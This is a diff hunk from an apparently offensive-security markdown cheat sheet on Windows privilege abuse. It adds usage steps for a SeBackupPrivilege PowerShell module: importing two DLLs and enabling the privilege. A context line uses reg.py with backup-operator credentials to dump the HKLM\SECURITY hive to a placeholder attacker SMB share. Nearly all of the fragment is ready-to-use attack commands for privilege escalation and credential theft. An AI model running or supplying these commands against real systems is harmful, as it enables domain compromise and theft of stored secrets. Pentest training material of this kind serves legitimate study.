@@ -42,6 +42,19 @@
 
  - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SECURITY' -o '\\attacker ip\share'
 
+## Alternate Method: SeBackupPrivilegeUtils https://github.com/giuliano108/SeBackupPrivilege
+
+### Usage:
+
+ - Import-Module .\SeBackupPrivilegeUtils.dll
+
+ - Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+ - Set-SeBackupPrivilege
+
+ - Get-SeBackupPrivilege
+
+
 
 ## SeTakeOwnership
 
